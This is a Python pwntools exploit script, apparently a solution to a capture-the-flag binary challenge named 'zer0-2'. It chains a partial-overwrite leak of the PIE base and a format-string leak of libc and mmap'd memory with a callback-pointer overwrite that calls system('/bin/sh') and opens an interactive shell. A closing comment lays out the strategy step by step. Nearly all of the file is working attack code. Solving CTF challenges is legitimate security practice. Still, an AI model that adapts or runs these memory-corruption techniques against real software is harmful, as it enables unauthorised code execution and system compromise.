#!/usr/bin/python
from pwn import *
import time, os

os.chdir('../setup')

elf = context.binary = ELF("zer0-2")
libc = elf.libc
#context.terminal = ['kitty', '@', 'launch', '--cwd', 'current', '--location', 'hsplit', '--title', 'DEBUG']
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
gs = '''
init-pwndbg
set follow-fork-mode parent
brva 0x156a
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

# Safelinking functions [https://github.com/mdulin2/mangle/]
def protect_ptr(target, addr):
	return (addr >> 12) ^ target

def reveal_ptr(mangled_ptr, addr):
	return protect_ptr(mangled_ptr, addr)

# og = one_gadget(libc.path,libc.address)
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def logbase(): log.info(f'Libc base: {libc.address:#x}')

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)


r= run()

# helper
p = b': '

def update(token):
    sla(p, b'1')
    sa(p, token)

def check():
    sla(p, b'2')

def auth():
    sla(p, b'3')

# =-=-=- Leak PIE -=-=-==-=

# lower 32 bytes
payload = p8(0) * 256
payload += p8(0x34)
update(payload)
check()
ru(b'...\n')
leak_lower = int(rl().strip().split()[7], 16)

# higher 32 bytes
payload = p8(0) * 256
payload += p8(0x38)
update(payload)
check()
ru(b'...\n')
leak_higher = int(rl().strip().split()[7], 16)

leak = (leak_higher << 32) + leak_lower
log_addr('Callbacks', leak)
elf.address = leak - elf.sym.callbacks
log_addr('PIE base', elf.address)

# =-=-=- Leak LIBC and mmap'd memory =-=-=-
payload = b'%p.%p.%p.%p.%p.%p.%p.%p.'
payload += b'A' * (0x100 - len(payload))
payload += p64(elf.got.printf - 0x18)
update(payload)

time.sleep(2)

auth()
ru(b'Authenticating...\n')
printf_leaks = rl().split(b'.')

mmap_leak = int(printf_leaks[6], 16) - 0x60
log_addr('Memory', mmap_leak)

libc_leak = int(printf_leaks[0], 16)
libc.address = libc_leak - (libc.sym._IO_2_1_stdout_ + 131)
log_addr('Libc', libc.address)


# =-=-=- RCE =-=-=-
time.sleep(2)

payload = b'/bin/sh\x00'
payload += p64(libc.sym.system)
payload += cyclic(0x100 - len(payload), n=8)
payload += p64(mmap_leak + 0x50)
update(payload)
auth()

# ====================================
r.interactive()

'''
Strategy
1. Leak PIE address
    - Use read_memory (update token) to partial overwrite token so we can leak memory based on following double deference:
        *(uint *)(*(long *)(token + 0x100) + 0xc)
    - Need to do two leaks because printf uses %x format string which only leaks 4 bytes
2. Leak LIBC and mmap'd memory address
    - place format string at first qword
    - overwrite offset 0x100 with elf.got.printf because:
        **(code **)(callback + 0x18))(token); (double derefence + 0x18)
    - 1st leak is libc (stdout) and 6th leak is mmap'd region (offset 0x60)
3. Overwrite token to get RCE:
    - place command string at first qword (memory_addr + 0x60)
    - place libc.sym.system() at second qword (memory_addr + 0x68)
    - Overwrite offset 0x100 with memory_addr + 0x50 because:
        **(code **)(callback + 0x18))(token); (double derefence + 0x18)
'''